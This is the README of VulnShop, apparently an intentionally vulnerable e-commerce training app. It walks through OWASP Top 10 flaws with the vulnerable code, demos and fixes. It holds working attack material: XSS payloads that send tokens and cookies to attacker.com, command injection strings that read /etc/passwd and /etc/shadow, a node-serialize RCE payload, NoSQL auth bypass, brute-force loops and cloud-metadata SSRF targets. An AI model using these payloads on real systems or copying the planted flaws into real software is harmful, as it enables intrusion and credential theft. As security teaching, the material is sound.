# ⚠️ VulnShop — OWASP Top 10 Security Training Application

> **FOR EDUCATIONAL PURPOSES ONLY. Never deploy to production or expose to the internet.**

VulnShop is a deliberately vulnerable Node.js + React + MongoDB e-commerce app that demonstrates all **OWASP Top 10 (2021)** vulnerabilities. Every vulnerability has a built-in demo panel in the browser so you can exploit it live without any external tools.

---

## Table of Contents

1. [Project Overview](#1-project-overview)
2. [Architecture & Tech Stack](#2-architecture--tech-stack)
3. [Setup & Installation](#3-setup--installation)
4. [Test Credentials & Seed Data](#4-test-credentials--seed-data)
5. [How to Navigate the App](#5-how-to-navigate-the-app)
6. [OWASP Top 10 Vulnerability Reference](#6-owasp-top-10-vulnerability-reference)
   - [A01 — Broken Access Control](#a012021--broken-access-control)
   - [A02 — Cryptographic Failures](#a022021--cryptographic-failures)
   - [A03 — Injection](#a032021--injection)
   - [A04 — Insecure Design](#a042021--insecure-design)
   - [A05 — Security Misconfiguration](#a052021--security-misconfiguration)
   - [A06 — Vulnerable & Outdated Components](#a062021--vulnerable--outdated-components)
   - [A07 — Identification & Authentication Failures](#a072021--identification--authentication-failures)
   - [A08 — Software & Data Integrity Failures](#a082021--software--data-integrity-failures)
   - [A09 — Security Logging & Monitoring Failures](#a092021--security-logging--monitoring-failures)
   - [A10 — Server-Side Request Forgery](#a102021--server-side-request-forgery-ssrf)
7. [Developer Checklist](#7-developer-checklist)
8. [Quick Fix Reference](#8-quick-fix-reference)

---

## 1. Project Overview

VulnShop simulates a real online store — product listings, user accounts, shopping orders, comments, and an admin panel — while intentionally implementing every vulnerability in the OWASP Top 10 (2021).

**Two-phase classroom design:**

- **Phase 1 — Show It Broken:** Run the app as-is and exploit each vulnerability using the built-in demo panels.
- **Phase 2 — Fix It:** Show the vulnerable code, discuss the fix, apply the change, verify it works.

---

## 2. Architecture & Tech Stack

| Layer | Technology | Port | Role |
|-------|-----------|------|------|
| Database | MongoDB (no auth) | 27017 | Users (plaintext passwords), products, orders, comments |
| Backend | Node.js + Express | 5000 | REST API — no security middleware, intentionally broken routes |
| Frontend | React 18 | 3000 | Shopping UI — renders raw HTML, JWT stored in localStorage |

### File Structure

```
vulnshop/
├── README.md
├── backend/
│   ├── server.js                  # Express app + misconfigured CORS, debug endpoint
│   ├── seed.js                    # Demo data seeder
│   ├── middleware/
│   │   └── auth.js                # Broken JWT middleware (decode not verify)
│   ├── models/
│   │   └── index.js               # Mongoose models (strict:false, plaintext passwords)
│   └── routes/
│       ├── auth.js                # Register, login, password reset
│       ├── products.js            # CRUD + file upload + path traversal
│       ├── orders.js              # CRUD orders (IDOR)
│       ├── users.js               # CRUD users (mass assignment, IDOR)
│       ├── admin.js               # Stats, ping (cmd injection), deserialize (RCE)
│       └── comments.js            # Stored XSS + SSRF fetch-preview
└── frontend/src/
    ├── utils/api.js               # Axios + JWT token in localStorage
    └── pages/
        ├── Home.js                # OWASP Top 10 map + credentials
        ├── Login.js               # NoSQL injection demo panel
        ├── Register.js            # Mass assignment privilege escalation demo
        ├── Products.js            # XSS, file upload, path traversal demos
        ├── ProductDetail.js       # Stored XSS comments, price manipulation, SSRF
        ├── Orders.js              # IDOR demo
        ├── Profile.js             # JWT decoder, plaintext password, priv-esc button
        ├── Admin.js               # JWT bypass, env dump, cmd injection, RCE
        └── UserList.js            # All passwords exposed, IDOR field editor
```

---

## 3. Setup & Installation

### Prerequisites

- **Node.js** v18+ — https://nodejs.org
- **MongoDB** Community Edition running locally
  - Install: https://www.mongodb.com/docs/manual/installation/
  - Start on Mac: `brew services start mongodb-community`
  - Start on Linux: `sudo systemctl start mongod`
  - Start on Windows: `net start MongoDB`

### Step 1 — Install Backend

```bash
cd vulnshop/backend
npm install
```

### Step 2 — Install Frontend

```bash
cd vulnshop/frontend
npm install
```

### Step 3 — Seed the Database

```bash
cd vulnshop/backend
node seed.js
```

Expected output:
```
[*] Connected, seeding...
[*] Users created: admin alice bob
[*] Products created: 5
[*] Orders created
[*] Comments created
✅ Seed complete!

Test Credentials:
   Admin: admin@vulnshop.com / admin123
   User:  alice@example.com  / password
   User:  bob@example.com    / 123456
```

### Step 4 — Start Backend (Terminal 1)

```bash
cd vulnshop/backend
npm run dev
```

Backend runs on **http://localhost:5000**

### Step 5 — Start Frontend (Terminal 2)

```bash
cd vulnshop/frontend
npm start
```

Frontend runs on **http://localhost:3000** — opens automatically in your browser.

---

## 4. Test Credentials & Seed Data

| Role | Email | Password | Notes |
|------|-------|----------|-------|
| Admin | admin@vulnshop.com | admin123 | `isAdmin: true`, full access |
| User | alice@example.com | password | Has orders, credit card in profile |
| User | bob@example.com | 123456 | Has orders, SSN in profile |

All passwords are stored as **plaintext** in MongoDB. Alice's profile contains a fake credit card number and Bob's contains a fake SSN — this is intentional to demonstrate PII mishandling.

---

## 5. How to Navigate the App

| Page | URL | What's Here |
|------|-----|-------------|
| Home | `/` | OWASP Top 10 overview map + credentials |
| Login | `/login` | Login form + NoSQL injection demo panel |
| Register | `/register` | Registration + mass assignment privilege escalation |
| Products | `/products` | Product grid + XSS add form + file upload + path traversal |
| Product Detail | `/products/:id` | Stored XSS comments + price manipulation + SSRF |
| Orders | `/orders` | All orders (IDOR) + fetch/modify any order |
| Profile | `/profile` | JWT decoder + plaintext password + priv-esc button |
| Users | `/users` | All users with passwords + IDOR field editor |
| Admin | `/admin` | JWT bypass + env dump + command injection + RCE |

Every vulnerable page has a **yellow demo panel** showing the vulnerability ID, description, attack payload, and a button to fire it live.

---

## 6. OWASP Top 10 Vulnerability Reference

---

### A01:2021 — Broken Access Control

**What it is:** Users can access or modify data they don't own, reach admin functionality, or bypass authorization entirely.

#### Where it lives in VulnShop

```javascript
// routes/orders.js — returns ALL orders, no filter
router.get('/', authMiddleware, async (req, res) => {
  const orders = await Order.find({});  // ← no userId filter!
  res.json(orders);
});

// routes/users.js — any user can update any other user
router.put('/:id', authMiddleware, async (req, res) => {
  const user = await User.findByIdAndUpdate(req.params.id, req.body); // ← no ownership check!
  res.json(user);
});

// middleware/auth.js — admin check doesn't verify the JWT signature
const decoded = jwt.decode(token);   // ← decode() ≠ verify()!
if (!decoded.isAdmin) return res.status(403)...
```

#### How to demo it

1. Log in as **Alice**
2. Go to **Orders** — Alice sees Bob's orders, addresses, and totals
3. Copy Bob's order ID and paste it into the IDOR Fetch box — full order returned
4. Go to `/users` — all users listed with plaintext passwords
5. Use the field editor: set field `isAdmin`, value `true` on Bob's account — instant privilege escalation

#### Attack payloads

```bash
# Fetch any order as any user
curl -H "Authorization: Bearer <alice_token>" http://localhost:5000/api/orders/<bob_order_id>

# Escalate privileges — set isAdmin on yourself
curl -X PUT http://localhost:5000/api/users/<your_id> \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"isAdmin": true, "role": "admin"}'
```

#### How to find it while developing

- After writing any database query, ask: *does this filter by the logged-in user's ID?*
- Search the codebase for `.find({})` and `.findById(` — check each one for an ownership filter
- Search for `jwt.decode(` — it should always be `jwt.verify(`
- Admin routes should check `isAdmin` against the **database**, not just the token payload
- Tool: replay requests in **Burp Suite** or **Postman** with a different user's token

#### The fix

```javascript
// Always filter by the logged-in user
const orders = await Order.find({ userId: req.user.userId });

// Verify ownership before update
const order = await Order.findOne({ _id: req.params.id, userId: req.user.userId });
if (!order) return res.status(403).json({ error: 'Forbidden' });

// Use verify(), not decode()
const decoded = jwt.verify(token, process.env.JWT_SECRET);

// Check admin role against DB, not token
const user = await User.findById(req.user.userId);
if (!user.isAdmin) return res.status(403).json({ error: 'Forbidden' });
```

---

### A02:2021 — Cryptographic Failures

**What it is:** Sensitive data exposed due to weak or missing encryption — plaintext passwords, hardcoded secrets, weak algorithms, insecure transmission.

#### Where it lives in VulnShop

```javascript
// models/index.js — password stored as plain string, no hashing
const UserSchema = new mongoose.Schema({
  password: { type: String },  // ← plaintext!
});

// routes/auth.js — hardcoded weak secret, no expiry
const JWT_SECRET = 'secret123';
const token = jwt.sign({ userId }, JWT_SECRET);  // ← no expiresIn!

// Login compares plaintext directly
const user = await User.findOne({ email, password });  // ← no bcrypt.compare!

// utils/api.js — token in localStorage
localStorage.setItem('token', token);  // ← any JS on the page can read this!
```

#### How to demo it

1. Open a terminal and run:
   ```bash
   mongosh vulnshop
   db.users.find({}, { username: 1, password: 1, _id: 0 })
   ```
   Passwords appear as `admin123`, `password`, `123456` — plaintext.

2. Log in, go to **Profile** — the decoded JWT payload is shown. Notice there is no `exp` field.

3. Open DevTools → Application → Local Storage — the raw JWT token is sitting there, readable by any JavaScript injected into the page.

4. Crack the secret:
   ```bash
   # The token uses 'secret123' as the HMAC key — in every password list
   hashcat -a 0 -m 16500 <jwt_token> /usr/share/wordlists/rockyou.txt
   ```

#### How to find it while developing

- Search the codebase for `password:` in model definitions — it should always be adjacent to a `bcrypt.hash()` call
- Search for `jwt.sign(` — verify `expiresIn` is set
- Search for `localStorage.setItem` — check if any token or credential is being stored there
- Run `npm audit` — flags packages with cryptographic weaknesses
- **Rule of thumb:** the word `password` in source code should only ever appear next to bcrypt functions

#### The fix

```javascript
const bcrypt = require('bcryptjs');

// Hash before saving
user.password = await bcrypt.hash(password, 12);

// Compare hash on login
const match = await bcrypt.compare(inputPassword, user.password);
if (!match) return res.status(401).json({ error: 'Invalid credentials' });

// Strong secret from env, with expiry
const token = jwt.sign({ userId }, process.env.JWT_SECRET, { expiresIn: '1h' });

// Use httpOnly cookie instead of localStorage
res.cookie('token', token, { httpOnly: true, secure: true, sameSite: 'strict' });

// Never return the password field
const user = await User.findById(id).select('-password');
```

---

### A03:2021 — Injection

**What it is:** Untrusted data is sent to an interpreter as part of a command or query. VulnShop has three distinct injection types.

---

#### 3a — NoSQL Injection

The login route passes `req.body` directly into a MongoDB query. MongoDB operators like `$gt`, `$regex`, and `$where` can be injected to bypass authentication.

**Vulnerable code:**

```javascript
// routes/auth.js
const { email, password } = req.body;
// password can be { "$gt": "" } — a MongoDB operator object
const user = await User.findOne({ email: email, password: password });
```

**Attack payload:**
```json
{
  "email": "admin@vulnshop.com",
  "password": { "$gt": "" }
}
```

MongoDB interprets `$gt: ""` as "password is greater than empty string" — true for every password. Login succeeds without knowing the password.

**How to demo:** Go to the Login page → yellow injection panel → paste payload → click Inject & Login.

**How to find while developing:**
- Any time `req.body` fields go directly into a Mongoose query — flag it
- Search for `.findOne({` and check if the values come from request input without sanitization
- The pattern `findOne({ field: req.body.field })` is almost always vulnerable

**The fix:**
```javascript
npm install express-mongo-sanitize

// server.js
const mongoSanitize = require('express-mongo-sanitize');
app.use(mongoSanitize());  // strips $ and . from all input

// Also cast to string to prevent object injection
const password = String(req.body.password);
```

---

#### 3b — Stored Cross-Site Scripting (XSS)

User comments are saved without sanitization and rendered using `dangerouslySetInnerHTML`. Any JavaScript in a comment runs in every visitor's browser permanently.

**Vulnerable code:**

```javascript
// routes/comments.js — content saved raw
const comment = new Comment({ productId, content });  // no sanitization

// frontend/ProductDetail.js — rendered as raw HTML
<div dangerouslySetInnerHTML={{ __html: comment.content }} />
```

**Attack payloads:**
```html
<!-- Basic popup -->
<img src=x onerror="alert('XSS: ' + document.cookie)">

<!-- Steal JWT token from localStorage -->
<img src=x onerror="fetch('http://attacker.com?t='+localStorage.getItem('token'))">

<!-- Cookie theft -->
<svg onload="fetch('http://attacker.com?c='+document.cookie)"></svg>
```

**How to demo:**
1. Go to any product page
2. Post comment: `<img src=x onerror="alert(document.cookie)">`
3. Alert fires for you immediately
4. Open incognito window, visit same product — alert fires for the anonymous visitor too
5. This is **stored** XSS — persists in the database and attacks every future visitor

**How to find while developing:**
- Search the entire codebase for `dangerouslySetInnerHTML` — every occurrence is a potential XSS
- Search for `innerHTML =` in vanilla JS — same risk
- Rule: if a value came from a user, it should **never** be rendered as HTML
- Any field that stores user text and is later displayed should be sanitized at render time

**The fix:**
```javascript
npm install dompurify

import DOMPurify from 'dompurify';

// Option 1 — safest: render as plain text
<div>{comment.content}</div>

// Option 2 — if HTML is genuinely needed: sanitize first
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(comment.content) }} />
```

---

#### 3c — OS Command Injection

The admin ping endpoint concatenates user input directly into a shell command. The `exec()` function passes this to `/bin/sh` which interprets shell metacharacters.

**Vulnerable code:**

```javascript
// routes/admin.js
const { host } = req.body;
exec(`ping -c 3 ${host}`, (error, stdout) => { res.json({ output: stdout }) });
// If host = "127.0.0.1; whoami", the shell runs:
// ping -c 3 127.0.0.1 ; whoami
```

**Attack payloads:**
```
127.0.0.1; whoami
127.0.0.1 && cat /etc/passwd
127.0.0.1 | ls -la /
127.0.0.1; env
127.0.0.1; cat /etc/shadow
```

**How to demo:** Admin panel → Ping Tool → enter `127.0.0.1; whoami` → output shows both ping result and the current OS user.

**How to find while developing:**
- Search for `exec(`, `execSync(`, `spawn(` — check if any argument includes user input
- The pattern `` exec(`...${userInput}...`) `` is almost always vulnerable
- Static analysis: `eslint-plugin-security` flags exec with string templates automatically

**The fix:**
```javascript
const { execFile } = require('child_process');

// execFile passes arguments as an array — no shell interpolation
execFile('ping', ['-c', '3', host], (err, stdout) => { ... });

// Also validate input format first
if (!/^[a-zA-Z0-9.\-]+$/.test(host)) {
  return res.status(400).json({ error: 'Invalid host' });
}
```

---

#### 3d — Mass Assignment

The User model uses `strict: false` and routes spread the entire request body into model constructors. An attacker can include any field — including `isAdmin: true` — and it gets saved to the database.

**Vulnerable code:**

```javascript
// models/index.js
const UserSchema = new mongoose.Schema({ ... }, { strict: false });
// strict: false means ANY field in the input gets saved

// routes/auth.js
const { username, email, password, ...rest } = req.body;
const user = new User({ username, email, password, ...rest });
// rest can contain { isAdmin: true, role: 'admin' }
```

**Attack payload:**
```json
{
  "username": "attacker",
  "email": "attacker@evil.com",
  "password": "hacked",
  "isAdmin": true,
  "role": "admin"
}
```

**How to demo:** Register page → click "Register as Admin" — sends `isAdmin: true` in the payload. After logging in, the Admin panel is accessible.

**The fix:**
```javascript
// Explicitly whitelist only the fields you want
const user = new User({
  username: req.body.username,
  email:    req.body.email,
  password: req.body.password
  // isAdmin is never taken from the request
});

// And use strict: true (the Mongoose default)
const UserSchema = new mongoose.Schema({ ... });  // remove strict: false
```

---

### A04:2021 — Insecure Design

**What it is:** Flaws at the architecture level — missing controls that can't be fixed with better code alone because the design itself is wrong.

#### 4a — Client-Side Price Manipulation

The order total is submitted by the frontend and saved directly. The server never recalculates the price from the database.

**Vulnerable code:**

```javascript
// routes/orders.js
const { products, total, address } = req.body;
const order = new Order({ userId, products, total, address });
//                                           ^^^^^ trusted from client!
await order.save();
```

**Attack payload:**
```bash
curl -X POST http://localhost:5000/api/orders \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"products":[{"productId":"<id>","quantity":1}],"total":0.01}'
# Order created for $0.01 instead of $999.99
```

**How to demo:** Product page → "Custom Price" field → type `0.01` → click "Buy at Custom Price" → check Orders — new order shows $0.01.

**How to find while developing:**
- Ask: *is any financial value coming from the client?* It should not be trusted.
- Search for `req.body.total`, `req.body.price`, `req.body.amount` — each is a red flag
- Prices, discounts, quantities should always be looked up server-side from the database

**The fix:**
```javascript
// Compute total server-side from database prices
let serverTotal = 0;
for (const item of products) {
  const product = await Product.findById(item.productId);
  if (!product) return res.status(400).json({ error: 'Product not found' });
  serverTotal += product.price * item.quantity;
}
const order = new Order({ userId, products, total: serverTotal, address });
```

#### 4b — Unrestricted File Upload

The upload endpoint accepts any file type, stores files with their original filenames, and serves them from a web-accessible directory. An attacker can upload an HTML file containing JavaScript which executes under the server's domain.

**Vulnerable code:**

```javascript
// routes/products.js
const storage = multer.diskStorage({
  filename: (req, file, cb) => cb(null, file.originalname), // ← original name kept!
  destination: (req, file, cb) => cb(null, './uploads'),    // ← web-accessible folder!
});
const upload = multer({ storage }); // ← no fileFilter, no size limit!
```

**Attack steps:**
1. Create `evil.html` with content: `<script>alert('XSS from ' + document.domain)</script>`
2. Upload it via Products page → File Upload
3. Visit `http://localhost:5000/uploads/evil.html` — JavaScript executes under the server's own origin

**How to find while developing:**
- Is `multer` (or any upload handler) configured without a `fileFilter`?
- Are uploaded files stored with user-controlled filenames?
- Is the upload directory inside the web root (accessible via a URL)?

**The fix:**
```javascript
const { v4: uuidv4 } = require('uuid');

const upload = multer({
  storage: multer.diskStorage({
    destination: './private-uploads',   // outside web root
    filename: (req, file, cb) => cb(null, uuidv4() + path.extname(file.originalname))
  }),
  fileFilter: (req, file, cb) => {
    const allowed = ['image/jpeg', 'image/png', 'image/webp'];
    cb(null, allowed.includes(file.mimetype));
  },
  limits: { fileSize: 5 * 1024 * 1024 }  // 5MB
});
```

---

### A05:2021 — Security Misconfiguration

**What it is:** Unnecessary features enabled, overly permissive settings, verbose errors, missing security headers, or exposed sensitive information.

#### Where it lives in VulnShop

```javascript
// server.js — CORS accepts any origin with credentials
app.use(cors({
  origin: true,          // ← reflects any origin!
  credentials: true,
  allowedHeaders: '*'
}));

// server.js — debug endpoint dumps everything
app.get('/api/debug', (req, res) => {
  res.json({ env: process.env, cwd: process.cwd(), memory: process.memoryUsage() });
  //              ^^^^^^^^^^^^ ALL environment variables sent to anyone who asks!
});

// server.js — stack traces in error responses
app.use((err, req, res, next) => {
  res.status(500).json({ error: err.message, stack: err.stack }); // ← stack trace exposed!
});

// No helmet() → no CSP, no X-Frame-Options, no HSTS, no Referrer-Policy
```

#### How to demo it

1. Open `http://localhost:5000/api/debug` — shows all env vars, node version, memory, working directory
2. Send a request with an invalid ID: `http://localhost:5000/api/products/badid` — full stack trace returned
3. Open `http://localhost:5000/uploads/` — directory listing shows all uploaded files
4. Show the CORS config in `server.js` — `origin: true` accepts requests from any domain

#### How to find while developing

- Search for `res.json({ stack` or `res.json({ error: err` — stack traces going to clients
- Check the CORS config — `origin` should be an explicit array of allowed domains, never `true` or `'*'`
- Check that `process.env` is never included in any API response
- Run `npm audit` and check for missing security packages like `helmet`
- Tool: **Mozilla Observatory** (`observatory.mozilla.org`) checks security headers of a running app

#### The fix

```javascript
npm install helmet

// server.js
const helmet = require('helmet');
app.use(helmet());  // sets 11 security headers in one line

// Explicit CORS allowlist
app.use(cors({ origin: ['http://localhost:3000'], credentials: true }));

// Generic error handler — log internally, never expose to client
app.use((err, req, res, next) => {
  console.error(err);  // log on server
  res.status(500).json({ error: 'Internal server error' });  // generic to client
});

// Delete the debug endpoint entirely
```

---

### A06:2021 — Vulnerable & Outdated Components

**What it is:** Using packages with known security vulnerabilities. The `node-serialize` package in VulnShop has a published Remote Code Execution CVE.

#### Where it lives

```javascript
// backend/package.json
"node-serialize": "^0.0.4"  // ← known RCE vulnerability (CVE-2017-5941)

// routes/admin.js
const nodeSerialize = require('node-serialize');
const obj = nodeSerialize.unserialize(JSON.stringify(req.body)); // ← RCE if payload contains IIFE
```

#### How to demo it

```bash
# In the backend directory
cd vulnshop/backend
npm audit
# Output: node-serialize  CRITICAL  Remote Code Execution
```

#### How to find while developing

- Run `npm audit` on every project — integrate it into your CI/CD pipeline
- Set up **GitHub Dependabot** or **Snyk** for automated dependency scanning
- Never use `serialize`/`unserialize` functions on data from the network
- Search for `eval(`, `new Function(`, `unserialize(` — each is a potential RCE vector
- Lock dependency versions in `package-lock.json` and audit on every pull request

#### The fix

```bash
npm uninstall node-serialize
```

```javascript
// For data exchange, use JSON.parse — it never executes code
const data = JSON.parse(req.body);

// Never use eval() or new Function() with any user-supplied input
```

---

### A07:2021 — Identification & Authentication Failures

**What it is:** Weak authentication — username enumeration, no brute force protection, predictable tokens, sessions that never expire.

#### Where it lives in VulnShop

```javascript
// routes/auth.js — username enumeration via different error messages
const emailExists = await User.findOne({ email });
if (!emailExists) {
  return res.status(401).json({ error: 'Email not found' });    // ← tells attacker email doesn't exist
}
return res.status(401).json({ error: 'Wrong password' });       // ← tells attacker email DOES exist

// routes/auth.js — predictable reset token
const resetToken = Date.now().toString();  // ← just a timestamp!
user.resetToken = resetToken;
res.json({ message: 'Reset token sent', resetToken });  // ← returned in response!

// No rate limiting on login — brute force freely
router.post('/login', async (req, res) => { ... });  // no limiter middleware
```

#### How to demo it

**Enumeration:**
```bash
# Unknown email → "Email not found"
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"nobody@fake.com","password":"x"}'

# Known email, wrong password → "Wrong password"
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.com","password":"x"}'
# Different message = alice@example.com is confirmed as a valid account
```

**Brute force (no protection):**
```bash
for p in admin password 123456 letmein qwerty; do
  curl -s -X POST http://localhost:5000/api/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@vulnshop.com\",\"password\":\"$p\"}"
done
```

**Predictable reset token:**
```bash
curl -X POST http://localhost:5000/api/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.com"}'
# Response: { "resetToken": "1703123456789" }  ← just a timestamp, returned in the response!
```

#### How to find while developing

- Check login and registration: do they return different messages for "email not found" vs "wrong password"?
- Is there a rate limiter middleware on authentication endpoints?
- Are password reset tokens generated with `crypto.randomBytes()`?
- Do reset tokens have an expiry field?
- Are reset tokens cleared from the database after use?

#### The fix

```javascript
npm install express-rate-limit

const rateLimit = require('express-rate-limit');
const loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 10 });
router.post('/login', loginLimiter, async (req, res) => { ... });

// Same error message regardless of which field was wrong
return res.status(401).json({ error: 'Invalid email or password' });

// Secure reset token
const crypto = require('crypto');
const resetToken = crypto.randomBytes(32).toString('hex');
user.resetToken   = resetToken;
user.resetExpiry  = Date.now() + 3600000;  // 1 hour
await user.save();
// Don't return the token in the API response — send it by email only

// After use, clear it
user.resetToken  = undefined;
user.resetExpiry = undefined;
await user.save();
```

---

### A08:2021 — Software & Data Integrity Failures

**What it is:** Code or data used without verifying its integrity. The most severe example is insecure deserialization — untrusted data is deserialized in a way that executes arbitrary code.

#### Where it lives in VulnShop

```javascript
// routes/admin.js
const nodeSerialize = require('node-serialize');
const obj = nodeSerialize.unserialize(JSON.stringify(req.body));
// node-serialize executes any IIFE (Immediately Invoked Function Expression)
// found in the serialized data — this is a documented RCE vulnerability
```

#### RCE Payload

```json
{
  "rce": "_$$ND_FUNC$$_function(){require('child_process').exec('id > /tmp/pwned.txt')}()"
}
```

The `_$$ND_FUNC$$_` marker tells `node-serialize` that the value is a function. The trailing `()` makes it an IIFE — it executes immediately on deserialization.

#### How to demo it

1. Go to **Admin panel → Deserialize**
2. Paste the payload above and click Deserialize
3. In a terminal: `cat /tmp/pwned.txt`
4. File contains the output of `id` — proving the server executed your command

#### How to find while developing

- Search for `serialize`, `unserialize`, `eval`, `new Function` — each is a potential RCE
- Run `npm audit` — this CVE shows up as CRITICAL immediately
- Any endpoint that accepts raw serialized data from the client is a red flag
- Never deserialize data from untrusted sources (HTTP requests, file uploads, cookies)

#### The fix

```javascript
// Remove node-serialize entirely
npm uninstall node-serialize

// For data exchange between client and server, JSON.parse is always sufficient
// JSON.parse never executes code — it only constructs plain objects
const data = JSON.parse(req.body);

// Never use eval() or new Function() with any user-supplied data
```

---

### A09:2021 — Security Logging & Monitoring Failures

**What it is:** Without logging and monitoring, attacks go undetected. The average time to discover a breach is over 200 days. VulnShop has zero security logging — all attacks in this guide leave no trace.

#### What is not logged in VulnShop

- Failed login attempts — brute force is invisible
- Successful logins with IP address
- Password reset requests and completions
- Admin panel access — who accessed it and when
- Privilege changes — `isAdmin` being set to `true`
- Access to other users' records (IDOR would be undetectable)
- File uploads — filename, uploader, timestamp
- Command execution from the ping tool

#### How to demo it

1. Perform all the attacks in this guide — multiple failed logins, IDOR, privilege escalation, command injection
2. Check the backend terminal — only generic HTTP access logs appear
3. Nothing says "failed login", "admin access", "privilege escalated", or "command executed"
4. There is no audit trail whatsoever

#### How to find while developing

- After any sensitive operation, ask: *would we know if this was abused?*
- Check: are failed auth attempts counted or alerted on?
- Check: is there an audit trail for admin actions?
- Run the attacks yourself and check your own logs — if you can't detect it, attackers won't be caught

#### The fix

```javascript
npm install winston

const winston = require('winston');
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'security.log' }),
    new winston.transports.Console()
  ]
});

// In login route
if (!user) {
  logger.warn({ event: 'login_failed', email, ip: req.ip, ua: req.headers['user-agent'], time: new Date() });
  return res.status(401).json({ error: 'Invalid email or password' });
}
logger.info({ event: 'login_success', userId: user._id, ip: req.ip, time: new Date() });

// In admin routes
logger.info({ event: 'admin_access', userId: req.user.userId, endpoint: req.path, ip: req.ip });

// On privilege change
logger.warn({ event: 'privilege_escalation', targetId: req.params.id, changedBy: req.user.userId });
```

---

### A10:2021 — Server-Side Request Forgery (SSRF)

**What it is:** The server fetches a URL supplied by the user, acting as a proxy to reach internal services, cloud metadata endpoints, or private network resources inaccessible from outside.

#### Where it lives in VulnShop

```javascript
// routes/comments.js — fetches any URL with zero restriction
const { url } = req.body;
const lib = url.startsWith('https') ? https : http;
lib.get(url, (response) => {
  // returns the full response body to the attacker
  res.json({ statusCode: response.statusCode, body: data });
});
```

#### Attack targets

```
# Internal APIs not meant to be public
http://localhost:5000/api/debug

# AWS instance metadata (cloud credentials, IAM roles)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP metadata
http://metadata.google.internal/computeMetadata/v1/

# Internal MongoDB
http://localhost:27017

# Internal network scan
http://192.168.1.1/admin
http://10.0.0.1/
```

#### How to demo it

1. Go to any **Product Detail** page
2. Scroll to **Link Preview (SSRF Demo)**
3. Enter: `http://localhost:5000/api/debug`
4. The server fetches its own internal debug endpoint and returns all environment variables to you

#### How to find while developing

- Search for `http.get(`, `https.get(`, `fetch(`, `axios.get(` — check if the URL comes from user input
- Any feature described as "preview a link" or "fetch a resource" is a potential SSRF vector
- Cloud deployments: can your app server reach the metadata endpoint at `169.254.169.254`?
- Test by pointing the feature at `http://localhost` and see what comes back

#### The fix

```javascript
const { URL } = require('url');

const ALLOWED_HOSTS = ['example.com', 'api.trusted-partner.com'];
const PRIVATE_IP = /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|127\.|169\.254\.)/;

router.post('/fetch-preview', async (req, res) => {
  let urlObj;
  try { urlObj = new URL(req.body.url); } catch {
    return res.status(400).json({ error: 'Invalid URL' });
  }

  if (!ALLOWED_HOSTS.includes(urlObj.hostname)) {
    return res.status(400).json({ error: 'Host not allowed' });
  }

  if (PRIVATE_IP.test(urlObj.hostname)) {
    return res.status(400).json({ error: 'Private addresses not allowed' });
  }
  // safe to fetch
});
```

---

## 7. Developer Checklist

Use this during development and code review to catch vulnerabilities before they reach production.

### Authentication & Authorization
- [ ] Every protected route has `authMiddleware` applied
- [ ] Admin routes verify `isAdmin` against the **database**, not just the JWT payload
- [ ] JWT uses `jwt.verify()`, never `jwt.decode()`
- [ ] JWT secret is in `.env`, not hardcoded, at least 64 random bytes
- [ ] JWT has `expiresIn` set (1 hour or less for sensitive apps)
- [ ] Tokens stored in `httpOnly` cookies, not `localStorage`
- [ ] Rate limiting on all authentication endpoints
- [ ] Password reset tokens use `crypto.randomBytes(32)`, not timestamps
- [ ] Reset tokens expire (max 1 hour) and are cleared after use

### Data Access
- [ ] Every query on user-owned data filters by `userId: req.user.userId`
- [ ] Every update/delete verifies the record belongs to the requesting user
- [ ] No route returns password fields — use `.select('-password')` in Mongoose
- [ ] PII (credit cards, SSNs) is encrypted at rest, not stored as plaintext

### Input Handling
- [ ] `express-mongo-sanitize` installed and applied globally
- [ ] No `req.body` spread directly into `new Model()` — fields are whitelisted explicitly
- [ ] User-generated content in the UI uses plain text rendering, not `innerHTML`
- [ ] `DOMPurify` used anywhere HTML rendering is unavoidable
- [ ] No `exec()` with user input — use `execFile()` with argument arrays

### File Handling
- [ ] File uploads validate MIME type server-side
- [ ] Uploaded files renamed to random UUIDs
- [ ] Upload directory is outside the web root
- [ ] Path traversal blocked: normalize paths and verify they start with the allowed directory

### Server Configuration
- [ ] `helmet()` applied in `server.js`
- [ ] CORS `origin` is an explicit array of allowed domains
- [ ] Error handler sends generic messages to client, logs details server-side only
- [ ] No debug endpoint that exposes env vars or internals
- [ ] `npm audit` runs in CI/CD and fails build on critical/high findings
- [ ] `process.env` is never included in any API response

### Outbound Requests
- [ ] Any feature fetching external URLs uses a domain allowlist
- [ ] Private IP ranges blocked: `10.x`, `172.16–31.x`, `192.168.x`, `127.x`, `169.254.x`

### Logging
- [ ] Failed login attempts logged with IP and timestamp
- [ ] Successful logins logged
- [ ] Admin actions logged
- [ ] Privilege changes logged and alerted
- [ ] Log retention policy defined

---

## 8. Quick Fix Reference

| ID | Vulnerability | Fix |
|----|--------------|-----|
| A01 | IDOR — no ownership filter | Add `{ userId: req.user.userId }` to all queries |
| A01 | Admin middleware uses `decode()` | Replace `jwt.decode()` with `jwt.verify()` |
| A02 | Plaintext passwords | Use `bcrypt.hash(password, 12)` before saving |
| A02 | Weak JWT secret | Move to `.env`, use `crypto.randomBytes(64).toString('hex')` |
| A02 | No JWT expiry | Add `{ expiresIn: '1h' }` to `jwt.sign()` |
| A02 | Token in localStorage | Use `httpOnly` cookie: `res.cookie('token', t, { httpOnly: true })` |
| A03 | NoSQL injection | `npm install express-mongo-sanitize` + `app.use(mongoSanitize())` |
| A03 | Stored XSS | Replace `dangerouslySetInnerHTML` with `{text}` or `DOMPurify.sanitize()` |
| A03 | Command injection | Replace `` exec(`...${input}`) `` with `execFile('cmd', [input])` |
| A03 | Mass assignment | Whitelist fields: `new User({ username, email, password })` |
| A04 | Price manipulation | Look up `product.price` from DB; never trust `req.body.total` |
